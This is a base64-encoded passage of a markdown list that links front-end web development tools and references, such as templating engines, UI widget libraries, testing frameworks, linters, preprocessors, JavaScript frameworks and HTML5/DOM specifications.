aHViLmlvL3RlbXBsYXRlLWNob29zZXIpKQoqIFtoYW5kbGViYXJzXShodHRw
Oi8vaGFuZGxlYmFyc2pzLmNvbS8pCiogW3B1cmVdKGh0dHA6Ly9iZWVib2xl
LmNvbS9wdXJlLykKKiBbZHVzdF0oaHR0cDovL2FrZHVieWEuZ2l0aHViLmlv
L2R1c3Rqcy8pCiogW3RyYW5zcGFyZW5jeV0oaHR0cDovL2xlb25pZGFzLmdp
dGh1Yi5pby90cmFuc3BhcmVuY3kvKQoqIFtwbGF0ZXNdKGh0dHBzOi8vZ2l0
aHViLmNvbS9mbGF0aXJvbi9wbGF0ZXMpCiogW211c3RhY2hlXShodHRwOi8v
bXVzdGFjaGUuZ2l0aHViLmNvbS8pCgkqIFtob2dhbi5qc10oaHR0cDovL3R3
aXR0ZXIuZ2l0aHViLmlvL2hvZ2FuLmpzLykKKiBbaWNhbmhhel0oaHR0cDov
L2ljYW5oYXpqcy5jb20vKQoqIFtkb1QuanNdKGh0dHA6Ly9vbGFkby5naXRo
dWIuaW8vZG9ULykKKiBbdW5kZXJzY29yZV0oaHR0cDovL3VuZGVyc2NvcmVq
cy5vcmcvI3RlbXBsYXRlKQoqIFttb2xkXShodHRwczovL2dpdGh1Yi5jb20v
aWRvdHR2L01vbGQpCiogW251bmp1Y2tzXShodHRwOi8vamxvbmdzdGVyLmdp
dGh1Yi5pby9udW5qdWNrcy8pCiogW1N3aWddKGh0dHA6Ly9wYXVsYXJtc3Ry
b25nLmdpdGh1Yi5pby9zd2lnLykKKiBbanRtcGxdKGh0dHA6Ly9qdG1wbC5j
b20vKQoqIFt0ZWRkeV0oaHR0cHM6Ly9naXRodWIuY29tL2tldGhpbm92L3Rl
ZGR5KQoKLS0tCgojIyMjIyNVSSBXaWRnZXRzIChbY29tcGFyaXNvbl0oaHR0
cDovL3Vpd2lkZ2V0cy50N2ludGVyYWN0aXZlLmNvbS8pKQoqIFtjaGljby11
aV0oaHR0cDovL2NoaWNvLXVpLmNvbS5hci8pCiogW2dvb2dsZSBjbG9zdXJl
XShodHRwOi8vY2xvc3VyZS1saWJyYXJ5Lmdvb2dsZWNvZGUuY29tL3N2bi90
cnVuay9jbG9zdXJlL2dvb2cvZGVtb3MvaW5kZXguaHRtbCkKKiBbREhUTUxY
XShodHRwOi8vZGh0bWx4LmNvbS8pCiogW2V4dEpTXShodHRwOi8vd3d3LnNl
bmNoYS5jb20vcHJvZHVjdHMvZXh0anMvZXhhbXBsZXMvKQoqIFtrZW5kb1VJ
XShodHRwOi8vd3d3LmtlbmRvdWkuY29tLykKKiBbcW9veGRvb10oaHR0cDov
L3Fvb3hkb28ub3JnLykKKiBbYm9vdHN0cmFwIGNvbXBvbmVudHMgJiBqYXZh
c2NyaXB0XShodHRwOi8vdHdpdHRlci5naXRodWIuY29tL2Jvb3RzdHJhcC9q
YXZhc2NyaXB0Lmh0bWwpCgkqIFtGdWVsIFVYXShodHRwOi8vZXhhY3R0YXJn
ZXQuZ2l0aHViLmNvbS9mdWVsdXgvKQoqIFt3aWptb10oaHR0cDovL3dpam1v
LmNvbS8pCiogW1lVSTMgV2lkZ2V0c10oaHR0cDovL3l1aWxpYnJhcnkuY29t
L3l1aS9kb2NzL2d1aWRlcy8pCiogW2Rvam8gZGlqaXRzXShodHRwOi8vZG9q
b3Rvb2xraXQub3JnL3JlZmVyZW5jZS1ndWlkZS8xLjgvZGlqaXQvaW5kZXgu
aHRtbCkKKiBbalF1ZXJ5IFVJXShodHRwOi8vanF1ZXJ5dWkuY29tLykKKiBb
WmlubyBVSV0oaHR0cDovL3ppbm91aS5jb20vKQoqIFtKS0lUXShodHRwOi8v
anF1ZXJ5LWpraXQuY29tLykKKiBbdzJ1aV0oaHR0cDovL3cydWkuY29tL3dl
Yi8pCiogW2Jhc2lzLmpzXShodHRwOi8vYmFzaXNqcy5jb20vKQoqIFt3ZWJp
eF0oaHR0cDovL2RvY3Mud2ViaXguY29tLykKKiBbYWxsb3l1aV0oaHR0cDov
L2FsbG95dWkuY29tLykKKiBbSmF2YVNjcmlwdCAoZnJvbSBzeW5jIGZ1c2lv
bildKGh0dHA6Ly93d3cuc3luY2Z1c2lvbi5jb20vcHJvZHVjdHMvamF2YXNj
cmlwdCkKKiBbalFXaWRnZXRzXShodHRwOi8vd3d3Lmpxd2lkZ2V0cy5jb20v
KQoqIFtmb3Jtc3RvbmVdKGh0dHA6Ly9mb3Jtc3RvbmUuaXQvKQoqIFt3aW5K
U10oaHR0cDovL3RyeS5idWlsZHdpbmpzLmNvbS8jcGxheSkKKiBbYXNzZXRz
LmNtcy5nb3ZdKGh0dHA6Ly9hc3NldHMuY21zLmdvdi8pCiogW3ppcHB5IHVp
XShodHRwOi8vemlwcHl1aS5jb20vKQotLS0KCiMjIyMjI1Rlc3RpbmcgRnJh
bWV3b3JrcwoKKiBbdGVzdGVtXShodHRwczovL2dpdGh1Yi5jb20vYWlycG9y
dHloL3Rlc3RlbSkKKiBbS2FybWFdKGh0dHA6Ly9rYXJtYS1ydW5uZXIuZ2l0
aHViLmlvLzAuOC9pbmRleC5odG1sKQoqIFtpbnRlcm5dKGh0dHA6Ly90aGVp
bnRlcm4uaW8vKQoqIFtidXN0ZXIuanNdKGh0dHA6Ly9idXN0ZXJqcy5vcmcv
KQoqIFtwcm92YV0oaHR0cDovL2dpdGh1Yi5jb20vYXplci9wcm92YSkKCi0t
LQoKIyMjIyMjQnJvd3NlciBUZXN0aW5nICYgQnJvd3NlciBBdXRvbWF0ZWQg
VGVzdGluZyAmIEJyb3dzZXIgU2NyZWVuIENhcHR1cmVzCgoqIFtjYXNwZXJK
U10oaHR0cDovL2Nhc3BlcmpzLm9yZy8pCiogW1NlbGVuaXVtXShodHRwOi8v
d3d3LnNlbGVuaXVtaHEub3JnLykKKiBbcGhhbnRvbUpTXShodHRwOi8vcGhh
bnRvbWpzLm9yZy8pCiogW3NhdWNlbGFic10oaHR0cHM6Ly9zYXVjZWxhYnMu
Y29tKQoqIFticm93c2Vyc3RhY2tdKGh0dHA6Ly93d3cuYnJvd3NlcnN0YWNr
LmNvbS8pCiogW2Jyb3dzZXJsaW5nXShodHRwczovL2Jyb3dzZXJsaW5nLmNv
bS8pCiogW0RhbGVrSlNdKGh0dHA6Ly9kYWxla2pzLmNvbS8pCiogW3Rlc3Rs
aW5nLWNpXShodHRwOi8vY2kudGVzdGxpbmcuY29tLykKKiBbY3Jvc3Nicm93
c2VydGVzdGluZy5jb21dKGh0dHA6Ly9jcm9zc2Jyb3dzZXJ0ZXN0aW5nLmNv
bS8pCiogW25pZ2h0d2F0Y2guanNdKGh0dHA6Ly9uaWdodHdhdGNoanMub3Jn
LykKKiBbUHJvdHJhY3Rvcl0oaHR0cHM6Ly9naXRodWIuY29tL2FuZ3VsYXIv
cHJvdHJhY3RvcikKCi0tLQoKIyMjIyMjVGVzdHMgUnVubmVycwoKKiBbbW9j
aGFdKGh0dHA6Ly92aXNpb25tZWRpYS5naXRodWIuY29tL21vY2hhLykKKiBb
cXVuaXRdKGh0dHA6Ly9xdW5pdGpzLmNvbS8pCiogW2phc21pbmVdKGh0dHA6
Ly9waXZvdGFsLmdpdGh1Yi5jb20vamFzbWluZS8pCiogW2plc3RdKGh0dHA6
Ly9mYWNlYm9vay5naXRodWIuaW8vamVzdC8pCiogW2pzdGVzdF0oaHR0cDov
L2pzdGVzdC5qY29nbGFuLmNvbS8pCgotLS0KCiMjIyMjI1Rlc3Qgc3BpZXMs
IHN0dWJzIGFuZCBtb2NrcwoKKiBbc2lub24uanNdKGh0dHA6Ly9zaW5vbmpz
Lm9yZy8pCgotLS0KCiMjIyMjI0NvZGUgQ292ZXJhZ2UKCiogW2lzdGFuYnVs
XShodHRwOi8vZ290d2FybG9zdC5naXRodWIuaW8vaXN0YW5idWwvKQoqIFti
bGFua2V0LmpzXShodHRwOi8vYmxhbmtldGpzLm9yZy8pCiogW2NvdmVyYWxs
c10oaHR0cHM6Ly9jb3ZlcmFsbHMuaW8vKQoKLS0tCgojIyMjIyNDb2RlIENv
bXBsZXhpdHkgJiBSZXBvcnRzCgoqIFtqc2NvbXBsZXhpdHldKGh0dHA6Ly9q
c2NvbXBsZXhpdHkub3JnLykKKiBbcGxhdG9dKGh0dHBzOi8vZ2l0aHViLmNv
bS9lcy1hbmFseXNpcy9wbGF0bykKCi0tLQoKIyMjIyMjQXNzZXJ0aW9uIExp
YnJhcmllcwoKKiBbY2hhaV0oaHR0cDovL2NoYWlqcy5jb20vKQoqIFtzaG91
bGRdKGh0dHBzOi8vZ2l0aHViLmNvbS92aXNpb25tZWRpYS9zaG91bGQuanMp
CiogW2V4cGVjdF0oaHR0cHM6Ly9naXRodWIuY29tL0xlYXJuQm9vc3QvZXhw
ZWN0LmpzKQoKLS0tCgojIyMjIyNKUyBQZXJmb3JtYW5jZSBUZXN0aW5nCgoq
IFtiZW5jaG1hcmsuanNdKGh0dHA6Ly9iZW5jaG1hcmtqcy5jb20vKQoqIFtq
c1BlcmYg4oCUIEphdmFTY3JpcHQgcGVyZm9ybWFuY2UgcGxheWdyb3VuZF0o
aHR0cDovL2pzcGVyZi5jb20vKQoKLS0tCgojIyMjIyNKUyBBdXRvIERvY3Vt
ZW50YXRpb24gVG9vbHMKKiBbeXVpRG9jXShodHRwOi8veXVpLmdpdGh1Yi5j
b20veXVpZG9jLykKKiBbZG9jY29dKGh0dHA6Ly9qYXNoa2VuYXMuZ2l0aHVi
LmNvbS9kb2Njby8pCgkqIFtkb2Njby1odXNreV0oaHR0cHM6Ly9naXRodWIu
Y29tL21icmV2b29ydC9kb2Njby1odXNreSkKKiBbanNkdWNrXShodHRwczov
L2dpdGh1Yi5jb20vc2VuY2hhbGFicy9qc2R1Y2spCiogW2pzZG9jXShodHRw
czovL2dpdGh1Yi5jb20vanNkb2MzL2pzZG9jKQoqIFtub2RlLWpzZG9jLXRv
b2xraXRdKGh0dHBzOi8vZ2l0aHViLmNvbS9wMTIwcGgzNy9ub2RlLWpzZG9j
LXRvb2xraXQpCiogW2RveF0oaHR0cHM6Ly9naXRodWIuY29tL3Zpc2lvbm1l
ZGlhL2RveCkKCSogW21hcmtkb3hdKGh0dHBzOi8vZ2l0aHViLmNvbS9jYm91
L21hcmtkb3gpCgkqIFtkb3gtZm91bmRhdGlvbl0oaHR0cHM6Ly9naXRodWIu
Y29tL3B1bmthdmUvZG94LWZvdW5kYXRpb24pCgotLS0KCiMjIyMjI0NTUyBB
dXRvIERvY3VtZW50YXRpb24gVG9vbHMgKFtUSEUgU3R5bGUgR3VpZGUgR1VJ
REVdKGh0dHA6Ly92aW5zcGVlLm1lL3N0eWxlLWd1aWRlLWd1aWRlLykpCiog
W2tzc10oaHR0cHM6Ly9naXRodWIuY29tL2tuZWF0aC9rc3MpCiogW3N0eWxl
ZG9jY28vXShodHRwOi8vamFjb2JyYXNrLmdpdGh1Yi5jb20vc3R5bGVkb2Nj
by8pCgotLS0KCiMjIyMjI0pTIFF1YWxpdHkgVmFsaWRhdG9ycwoqIFtqc2xp
bnRdKGh0dHA6Ly93d3cuanNsaW50LmNvbS8pCiogW2pzaGludF0oaHR0cDov
L3d3dy5qc2hpbnQuY29tLykKKiBbSlNMaW50IEVycm9yIEV4cGxhbmF0aW9u
c10oaHR0cDovL2pzbGludGVycm9ycy5jb20vKQoqIFtqc2NvbXBsZXhpdHld
KGh0dHA6Ly9qc2NvbXBsZXhpdHkub3JnLykKKiBbZXNsaW50XShodHRwczov
L2dpdGh1Yi5jb20vZXNsaW50L2VzbGludCkKKiBbbm9kZS1qc2NzXShodHRw
czovL2dpdGh1Yi5jb20vbWRldmlscy9ub2RlLWpzY3MvKQoKLS0tCgojIyMj
IyNDU1MgUXVhbGl0eSBWYWxpZGF0b3JzCiogW2Nzc2xpbnRdKGh0dHA6Ly9j
c3NsaW50Lm5ldC8pCiogW3JlY2Vzc10oaHR0cDovL3R3aXR0ZXIuZ2l0aHVi
LmNvbS9yZWNlc3MpCgotLS0KCiMjIyMjI0hUTUwgUXVhbGl0eSBWYWxpZGF0
b3JzCiogW2h0bWwtaW5zcGVjdG9yXShodHRwczovL2dpdGh1Yi5jb20vcGhp
bGlwd2FsdG9uL2h0bWwtaW5zcGVjdG9yKQoqIFtodG1sSGludF0oaHR0cDov
L2h0bWxoaW50LmNvbS8pCgotLS0KCiMjIyMjI0pTIE9wdGltaXplci9NaW5p
ZmljYXRpb24vQ29tcHJlc3Npb24gVG9vbHMKKiBbZ29vZ2xlIGNsb3N1cmUg
Y29tcGlsZXJdKGh0dHBzOi8vZGV2ZWxvcGVycy5nb29nbGUuY29tL2Nsb3N1
cmUvY29tcGlsZXIvKQoqIFt1Z2xpZnlKU10oaHR0cHM6Ly9naXRodWIuY29t
L21pc2hvby9VZ2xpZnlKUykKKiBbRXNwcmltYV0oaHR0cDovL2VzcHJpbWEu
b3JnL2luZGV4Lmh0bWwpCgotLS0KCiMjIyMjI0NTUyBPcHRpbWl6ZXIvTWlu
aWZpY2F0aW9uL0NvbXByZXNzaW9uIFRvb2xzCiogW3ljc3NtaW5dKGh0dHBz
Oi8vZ2l0aHViLmNvbS95dWkveWNzc21pbikKKiBbQ1NTT10oaHR0cDovL2Nz
cy5naXRodWIuaW8vY3Nzby8pCgotLS0KCiMjIyMjI0xhbmd1YWdlcyBDb21w
aWxpbmcgdG8gQ1NTCiogW1Nhc3NdKGh0dHA6Ly9zYXNzLWxhbmcuY29tLykK
CSogW2NvbXBhc3NdKGh0dHA6Ly9jb21wYXNzLXN0eWxlLm9yZykKCSogW2lu
dWl0LmNzc10oaHR0cHM6Ly9naXRodWIuY29tL2Nzc3dpemFyZHJ5L2ludWl0
LmNzcykKCSogW0JvdXJib25dKGh0dHBzOi8vZ2l0aHViLmNvbS90aG91Z2h0
Ym90L2JvdXJib24pOiBNaXhpbnMgbGlicmFyeSBmb3IgU2FzcwoJKiBbTmVh
dF0oaHR0cHM6Ly9naXRodWIuY29tL3Rob3VnaHRib3QvbmVhdCk6IFNlbWFu
dGljIENTUyBncmlkIGZyYW1ld29yawoqIFtzdHlsdXNdKGh0dHA6Ly9sZWFy
bmJvb3N0LmdpdGh1Yi5jb20vc3R5bHVzLykKCSogW25pYl0oaHR0cDovL3Zp
c2lvbm1lZGlhLmdpdGh1Yi5jb20vbmliLykKKiBbbGVzc10oaHR0cDovL2xl
c3Njc3Mub3JnKQoJKiBbTEVTUyBFbGVtZW50c10oaHR0cDovL2xlc3NlbGVt
ZW50cy5jb20vKTogTWl4aW5zIGxpYnJhcnkgZm9yIExFU1MKCSogW1NlbWFu
dGljLmdzXShodHRwOi8vc2VtYW50aWMuZ3MvKTogU2VtYW50aWMgQ1NTIGdy
aWQgc3lzdGVtCiogW0Fic3VyZF0oaHR0cDovL2tyYXNpbWlyLmdpdGh1Yi5p
by9hYnN1cmQvI2NsaWVudC1zaWRlLXRlc3RzKQoqIFtteXRoXShodHRwOi8v
d3d3Lm15dGguaW8vKQoKIyMjIyMjTGFuZ3VhZ2VzIENvbXBpbGluZyB0byBK
UyAoW2h0dHA6Ly9hbHRqcy5vcmcvXShodHRwOi8vYWx0anMub3JnLykpCiog
W2NvZmZlZVNjcmlwdF0oaHR0cDovL2NvZmZlZXNjcmlwdC5vcmcvKQoqIFtk
YXJ0XShodHRwOi8vd3d3LmRhcnRsYW5nLm9yZy8pCiogW3JveV0oaHR0cHM6
Ly9naXRodWIuY29tL3B1ZnV3b3p1L3JveSkKKiBbQ2xvanVyZVNjcmlwdF0o
aHR0cHM6Ly9naXRodWIuY29tL2Nsb2p1cmUvY2xvanVyZXNjcmlwdCkKKiBb
VHlwZVNjcmlwdF0oaHR0cDovL3d3dy50eXBlc2NyaXB0bGFuZy5vcmcvKQoK
LS0tCgojIyMjIyNMYW5ndWFnZXMgQ29tcGlsaW5nIHRvIEhUTUwKKiBbamFk
ZV0oaHR0cDovL2phZGUtbGFuZy5jb20vKQoqIFtoYW1sXShodHRwczovL2dp
dGh1Yi5jb20vaGFtbC9oYW1sKQoqIFtibGFkZV0oaHR0cHM6Ly9naXRodWIu
Y29tL2JtaW5lci9ub2RlLWJsYWRlKQoqIFttYXJrZG93bl0oaHR0cDovL2Rh
cmluZ2ZpcmViYWxsLm5ldC9wcm9qZWN0cy9tYXJrZG93bi8pCiogW3NsaW1d
KGh0dHA6Ly9zbGltLWxhbmcuY29tLykKCi0tLQoKIyMjIyMjUm91dGVycwoK
KiBbY3Jvc3Nyb2Fkcy5qc10oaHR0cDovL21pbGxlcm1lZGVpcm9zLmdpdGh1
Yi5pby9jcm9zc3JvYWRzLmpzLykKKiBbZGF2aXMuanNdKGh0dHA6Ly9kYXZp
c2pzLmNvbS8pCiogW1JvdXRpZV0oaHR0cDovL3Byb2plY3RzLmpnYS5tZS9y
b3V0aWUvKQoqIFtkaXJlY3Rvcl0oaHR0cHM6Ly9naXRodWIuY29tL2ZsYXRp
cm9uL2RpcmVjdG9yKQoqIFtGaW5jaC5qc10oaHR0cDovL3N0b29kZGVyLmdp
dGh1Yi5pby9maW5jaGpzLykKKiBbcGFnZS5qc10oaHR0cDovL3Zpc2lvbm1l
ZGlhLmdpdGh1Yi5pby9wYWdlLmpzLykKCi0tLQoKIyMjIyMjRnJvbnQgRW5k
IEFwcGxpY2F0aW9uIFN0cnVjdHVyZSAoc29tZXdoYXQgYmFja2VuZCBhZ25v
c3RpYykKKiBbYmFja2JvbmVdKGh0dHA6Ly9iYWNrYm9uZWpzLm9yZy8pCgkq
IFttYXJpb25ldHRlXShodHRwOi8vbWFyaW9uZXR0ZWpzLmNvbSkKCSogW2No
YXBsaW5dKGh0dHA6Ly9jaGFwbGluanMuZ2l0aHViLmNvbS8pCgkqIFthdXJh
XShodHRwOi8vYWRkeW9zbWFuaS5naXRodWIuY29tL2F1cmEvKQoJKiBbdGhv
cmF4XShodHRwOi8vd2FsbWFydGxhYnMuZ2l0aHViLmNvbS90aG9yYXgvKQoq
IFtlbWJlcl0oaHR0cDovL2VtYmVyanMuY29tLykKKiBba25vY2tvdXRdKGh0
dHA6Ly9rbm9ja291dGpzLmNvbS8pCiogW2NhbmpzXShodHRwOi8vY2FuanMu
dXMvKQoqIFtzcGluZV0oaHR0cDovL3NwaW5lanMuY29tLykKKiBbYW5ndWxh
ckpTXShodHRwOi8vYW5ndWxhcmpzLm9yZy8pCgkqIFtuZ21vZHVsZXMub3Jn
XShodHRwOi8vbmdtb2R1bGVzLm9yZy8pCiogW21hcmlhXShodHRwOi8vcGV0
ZXIubWljaGF1eC5jYS9tYXJpYS8pCiogW3NwYXJreS5qc10oaHR0cDovL3Nw
YXJreWpzLmNvbS8pCiogW2hvb2RpZV0oaHR0cDovL2hvb2QuaWUvKQoqIFts
dXJlLmpzXShodHRwOi8vdHlsZXJidWNoZWEuY29tL3Byb2plY3RzL2x1cmUv
Iy8pCiogW3Jpb3QuanNdKGh0dHBzOi8vZ2l0aHViLmNvbS9tb290L3Jpb3Rq
cy8pCiogW3Z1ZS5qc10oaHR0cDovL3Z1ZWpzLm9yZy8pCiogW21pdGhyaWxd
KGh0dHA6Ly9saG9yaWUuZ2l0aHViLmlvL21pdGhyaWwvKQoKLS0tCgojIyMj
IyNGcm9udCBFbmQgQXBwbGljYXRpb24gU3RydWN0dXJlICh3aXRoIGJhY2tl
bmQgb3BpbmlvbnMpCiogW2RlcmJ5XShodHRwOi8vZGVyYnlqcy5jb20vKSAo
cmVxdWlyZXMgTm9kZUpTKQoqIFtmbGF0aXJvbl0oaHR0cDovL2ZsYXRpcm9u
anMub3JnLykgKHJlcXVpcmVzIE5vZGVKUykKKiBbYmF0bWFuLmpzXShodHRw
Oi8vYmF0bWFuanMub3JnLykgKHJlcXVpcmVzIE5vZGVKUykKKiBbanNNVkNd
KGh0dHA6Ly9qYXZhc2NyaXB0bXZjLmNvbS8pIChyZXF1aXJlcyBKYXZhKQoq
IFttb250YWdlXShodHRwOi8vbW9udGFnZWpzLm9yZy8pIChyZXF1aXJlcyBO
b2RlSlMpCgotLS0KCiMjIyMjI0Z1bGwgU3RhY2sgQXBwbGljYXRpb24gU3Ry
dWN0dXJlL0ZyYW1ld29ya3MKKiBbd2FrYW5kYV0oaHR0cDovL3d3dy53YWth
bmRhLm9yZy8pCiogW21ldGVvcl0oaHR0cDovL3d3dy5tZXRlb3IuY29tLykK
Ci0tLQoKIyMjIyMjRnJvbnRlbmQgSmF2YVNjcmlwdCBGcmFtZXdvcmtzIChh
a2EgS2l0Y2hlbiBTaW5rIFNvbHV0aW9ucywgdG9vbHMgYmVsb3cgcHJvdmlk
ZSBhIG1peHR1cmUgb2YgdGhlIHRoaW5ncyBhYm92ZSkKKiBbWVVJM10oaHR0
cDovL3l1aWxpYnJhcnkuY29tL3Byb2plY3RzL3l1aTMvKQoqIFtkb2pvXSho
dHRwOi8vZG9qb3Rvb2xraXQub3JnLykKKiBbZXh0SlNdKGh0dHA6Ly93d3cu
c2VuY2hhLmNvbS9wcm9kdWN0cy9leHRqcy8pCiogW3Fvb3hkb29dKGh0dHA6
Ly9xb294ZG9vLm9yZy8pCiogW2dvb2dsZSBjbG9zdXJlXShodHRwczovL2Rl
dmVsb3BlcnMuZ29vZ2xlLmNvbS9jbG9zdXJlLykKCiMjIyMjI0Zyb250IEVu
ZCBBcHBsaWNhdGlvbiBtb25pdG9yaW5nCgoqIFtDYWxpcGVyXShodHRwOi8v
Y2FsaXBlci5pbykKCi0tLQoKIyNSZWZlcmVuY2UvR3VpZGUvUG9seWZpbGwv
R2VuZXJhdG9yIFRvb2xzCgoKIyMjIyMjQnJvd3NlciBYIFN1cHBvcnRzIFgK
KiBbaHR0cDovL2Nhbml1c2UuY29tL10oaHR0cDovL2Nhbml1c2UuY29tLykK
KiBbaHR0cDovL2h0bWw1cGxlYXNlLmNvbS9dKGh0dHA6Ly9odG1sNXBsZWFz
ZS5jb20vKQoqIFtodHRwOi8vaHRtbDVyZWFkaW5lc3MuY29tL10oaHR0cDov
L2h0bWw1cmVhZGluZXNzLmNvbS8pCiogW2h0bWw1dGVzdC5jb21dKGh0dHA6
Ly9odG1sNXRlc3QuY29tL2luZGV4Lmh0bWwpCiogW2h0dHA6Ly93d3cuYnJv
d3NlcnN1cHBvcnQubmV0L10oaHR0cDovL3d3dy5icm93c2Vyc3VwcG9ydC5u
ZXQvKQoqIFtodHRwOi8vY3NzM3Rlc3QuY29tL10oaHR0cDovL2NzczN0ZXN0
LmNvbS8pCiogW0Jyb3dzZXJzY29wZV0oaHR0cDovL3d3dy5icm93c2Vyc2Nv
cGUub3JnLykKKiBbSFRNTDUgJiBDU1MzIFN1cHBvcnRdKGh0dHA6Ly93d3cu
ZmluZG1lYnlpcC5jb20vbGl0bXVzLykKKiBbQ1NTNC1TZWxlY3RvcnNdKGh0
dHA6Ly9jc3M0LXNlbGVjdG9ycy5jb20vc2VsZWN0b3JzLykKKiBbSFRNTDUg
LSBJbmZvcm1hdGlvbiBhbmQgc2FtcGxlcyBmb3IgSFRNTDUgYW5kIHJlbGF0
ZWQgQVBJc10oaHR0cDovL3JvYmVydG55bWFuLmNvbS9odG1sNS8pCiogW0NT
UzMgLSBJbmZvcm1hdGlvbiBhbmQgc2FtcGxlc10oaHR0cDovL3JvYmVydG55
bWFuLmNvbS9jc3MzLykKKiBbSmF2YVNjcmlwdCB0ZXN0cyAmIENvbXBhdGli
aWxpdHkgdGFibGVzXShodHRwOi8vcm9iZXJ0bnltYW4uY29tL2phdmFzY3Jp
cHQvKQoqIFtDcm9zcyBCcm93c2VyIEhhbmRib29rIEtub3dsZWRnZWJhc2Vd
KGh0dHA6Ly93d3cuY3Jvc3Nicm93c2VyYm9vay5jb20vS25vd2xlZGdlKQoq
IFtKUy1Db21wYXRpYmlsaXR5LVRhYmxlXShodHRwOi8vY29tcGF0aWJpbGl0
eS5zaHd1cHMtY21zLmNoL2RlL2hvbWUvPykKKiBbd2ViYnJvd3NlcmNvbXBh
dGliaWxpdHldKGh0dHA6Ly93d3cud2ViYnJvd3NlcmNvbXBhdGliaWxpdHku
Y29tLykKCi0tLQoKIyMjIyMjSFRNTCBMYW5ndWFnZSBSZWZlcmVuY2VzICYg
UG9seWZpbGxzCiogW0hUTUw1IEEgdGVjaG5pY2FsIHNwZWNpZmljYXRpb24g
Zm9yIFdlYiBkZXZlbG9wZXJzXShodHRwOi8vZGV2ZWxvcGVycy53aGF0d2cu
b3JnLykKKiBbSFRNTCBMaXZpbmcgU3RhbmRhcmRdKGh0dHA6Ly93d3cud2hh
dHdnLm9yZy9zcGVjcy93ZWItYXBwcy9jdXJyZW50LXdvcmsvbXVsdGlwYWdl
LykKKiBbSFRNTDUgQSB2b2NhYnVsYXJ5IGFuZCBhc3NvY2lhdGVkIEFQSXMg
Zm9yIEhUTUwgYW5kIFhIVE1MXShodHRwOi8vd3d3LnczLm9yZy9UUi9odG1s
NS8pCiogW0hUTUwgNSBSZWZlcmVuY2UgQSBXZWIgRGV2ZWxvcGVy4oCZcyBH
dWlkZSB0byBIVE1MIDVdKGh0dHA6Ly9kZXYudzMub3JnL2h0bWw1L2h0bWwt
YXV0aG9yLykKKiBbSHlwZXJUZXh0IE1hcmt1cCBMYW5ndWFnZSAoSFRNTCks
IGZyb20gTW96aWxsYV0oaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcv
ZW4tVVMvZG9jcy9IVE1MKQoqIFtIVE1MNSBkaWZmZXJlbmNlcyBmcm9tIEhU
TUw0XShodHRwOi8vZGV2LnczLm9yZy9odG1sNS9odG1sNC1kaWZmZXJlbmNl
cy8pCiogW2h0bWw1c2hpdl0oaHR0cHM6Ly9naXRodWIuY29tL2FGYXJrYXMv
aHRtbDVzaGl2KQoqIFtodG1sNS5qc10oaHR0cHM6Ly9naXRodWIuY29tL2Jl
c3RpZWpzL2h0bWw1LmpzKQoKLS0tCgojIyMjIyNIVE1MNSAmIEZyaWVuZHMg
U3BlY3MvUmVmICYgUG9seWZpbGxzCiogW3dlYmJyb3dzZXJjb21wYXRpYmls
aXR5LmNvbV0oaHR0cDovL3d3dy53ZWJicm93c2VyY29tcGF0aWJpbGl0eS5j
b20vKQoqIFtIVE1MNSAmIEZyaWVuZHMsIGZyb20gTW96aWxsYV0oaHR0cHM6
Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9IVE1ML0hUTUw1
KQoqIFtodG1sNXJvY2tzXShodHRwOi8vd3d3Lmh0bWw1cm9ja3MuY29tL2Vu
LykKKiBbSFRNTDUgQ3Jvc3MgQnJvd3NlciBQb2x5ZmlsbHNdKGh0dHBzOi8v
Z2l0aHViLmNvbS9Nb2Rlcm5penIvTW9kZXJuaXpyL3dpa2kvSFRNTDUtQ3Jv
c3MtQnJvd3Nlci1Qb2x5ZmlsbHMpCiogW0hUTUw1IC0gSW5mb3JtYXRpb24g
YW5kIHNhbXBsZXMgZm9yIEhUTUw1IGFuZCByZWxhdGVkIEFQSXNdKGh0dHA6
Ly9yb2JlcnRueW1hbi5jb20vaHRtbDUvKQoqIFtIVE1MIDUgRGVtb3MgYW5k
IEV4YW1wbGVzXShodHRwOi8vaHRtbDVkZW1vcy5jb20vKQoqIFtTVkddKGh0
dHBzOi8vZGV2ZWxvcGVyLm1vemlsbGEub3JnL2VuLVVTL2RvY3MvU1ZHKQoJ
KiBbU1ZHLWVkaXQgYnJvd3NlciBlZGl0b3JdKGh0dHA6Ly9zdmctZWRpdC5n
b29nbGVjb2RlLmNvbS9zdm4taGlzdG9yeS9yMTc3MS90cnVuay9lZGl0b3Iv
c3ZnLWVkaXRvci5odG1sKQoJKiBbRDMuanNdKGh0dHA6Ly9kM2pzLm9yZy8p
CgkqIFtyYXBoYWVsanNdKGh0dHA6Ly9yYXBoYWVsanMuY29tLykKCSogW2Jv
bnNhaWpzLm9yZ10oaHR0cDovL2JvbnNhaWpzLm9yZy8pCgkqIFtzbmFwc3Zn
LmlvXShodHRwOi8vc25hcHN2Zy5pby8pCiogW0NhbnZhc10oaHR0cHM6Ly9k
ZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9IVE1ML0NhbnZhcykK
CSogW3BhcGVyLmpzXShodHRwOi8vcGFwZXJqcy5vcmcvKQoJKiBbZmFicmlj
LmpzXShodHRwOi8vZmFicmljanMuY29tLykKCSogW2tpbmV0aWNqc10oaHR0
cDovL2tpbmV0aWNqcy5jb20vKQoqIFt3ZWJHTF0oaHR0cHM6Ly9kZXZlbG9w
ZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWJHTCkKCSogW3RocmVlLmpz
XShodHRwOi8vbXJkb29iLmdpdGh1Yi5jb20vdGhyZWUuanMvKQoJKiBbVGhl
IFggVG9vbGtpdF0oaHR0cHM6Ly9naXRodWIuY29tL3h0ay9YI3JlYWRtZSkK
Ci0tLQoKIyMjIyMjRE9NIFNwZWNzL1JlZiAmIFBvbHlmaWxscwoqIFtET00g
TGl2aW5nIFN0YW5kYXJkXShodHRwOi8vZG9tLnNwZWMud2hhdHdnLm9yZy8p
CiogW0RPTSBQYXJzaW5nIGFuZCBTZXJpYWxpemF0aW9uIExpdmluZyBTdGFu
ZGFyZF0oaHR0cDovL2RvbXBhcnNpbmcuc3BlYy53aGF0d2cub3JnLykKKiBb
RE9NNF0oaHR0cDovL3d3dy53My5vcmcvVFIvZG9tLykKKiBbRG9jdW1lbnQg
T2JqZWN0IE1vZGVsIChET00pIFRlY2huaWNhbCBSZXBvcnRzLCBmcm9tIFcz
Q10oaHR0cDovL3d3dy53My5vcmcvRE9NL0RPTVRSKQoqIFtEb2N1bWVudCBP
